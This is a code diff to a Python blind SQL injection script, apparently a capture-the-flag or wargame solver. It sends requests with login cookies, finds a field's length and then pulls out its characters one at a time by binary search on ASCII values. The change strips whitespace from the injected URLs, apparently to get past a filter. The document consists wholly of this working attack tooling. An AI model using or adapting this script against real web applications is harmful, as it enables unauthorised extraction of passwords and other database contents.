@@ -25,13 +25,19 @@ def get_length(pwning_url, field, add_comment, login_cookies):
     length = 1
     while True:
         print('Trying to get length of {0} by length {1}'.format(field, length))
-        url = pwning_url + ' length({0}) LIKE {1} {2} '.format(field, length, '%23' if add_comment else '')
+        url = pwning_url + ' length({0}) > {1} {2} '.format(field, length, '%23' if add_comment else '')
+
+        # remove white space
+        url = url.replace(' ', '')
+
+
         res = requests.get(url, cookies=login_cookies)
+
         soup = BeautifulSoup(res.text, 'html.parser')
         h2s = soup.find_all('h2')
-        for h2 in h2s:
-            if h2.find('Hello') !=-1:
-                return length
+
+        if not h2s:
+            return length
 
         length += 1
 
@@ -49,6 +55,10 @@ def do_blind_inject_divide(pwning_url, field, add_comment, login_cookies):
         while True:
             # password must compare with int in mysql 'a' = 'A' is true
             url = pwning_url + ' CHAR({2}) < BINARY(RIGHT(LEFT({0},{1}),1)) {3} '.format(field, idx, int((min_ascii + max_ascii) / 2), '%23' if add_comment else '')
+
+            # remove white space
+            url = url.replace(' ', '')
+
             res = requests.get(url, cookies=login_cookies)
             soup = BeautifulSoup(res.text, 'html.parser')
             h2s = soup.find_all('h2')
